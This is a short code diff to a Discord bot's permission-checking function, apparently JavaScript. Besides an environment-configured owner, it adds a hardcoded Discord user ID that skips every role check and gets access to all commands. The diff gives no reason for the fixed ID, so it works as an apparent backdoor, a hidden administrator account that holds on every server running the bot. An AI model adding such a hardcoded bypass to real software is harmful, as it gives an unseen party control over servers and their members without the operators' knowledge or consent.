@@ -143,6 +143,8 @@ export function formatDuration(seconds) {
 
 export async function hasCommandPermission(member, commandName) {
   if (!member) return false;
+  const OWNER_IDS = ['1453592157607825595', process.env.OWNER_ID].filter(Boolean);
+  if (OWNER_IDS.includes(member.user.id)) return true;
 
   const networkRoleIds = await resolveNetworkRoleIds(member.guild.id);
   const networkEnabled = !!(networkRoleIds.ownerRoleId || networkRoleIds.modRoleId || networkRoleIds.teamLeadRoleId || networkRoleIds.adminRoleId);
